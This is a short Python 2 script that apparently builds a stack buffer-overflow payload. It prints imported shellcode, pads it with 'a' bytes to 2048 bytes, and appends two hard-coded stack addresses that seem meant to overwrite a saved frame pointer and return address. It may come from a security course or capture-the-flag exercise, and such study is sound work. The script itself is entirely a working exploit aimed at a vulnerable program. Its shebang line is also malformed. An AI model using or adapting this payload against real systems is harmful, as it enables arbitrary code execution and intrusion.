#!usr/bin/python

from shellcode import shellcode
print shellcode  + '\x61'* (2048 - 23) + '\xb8\x76\xfe\xbf' + '\xcc\x7e\xfe\xbf';


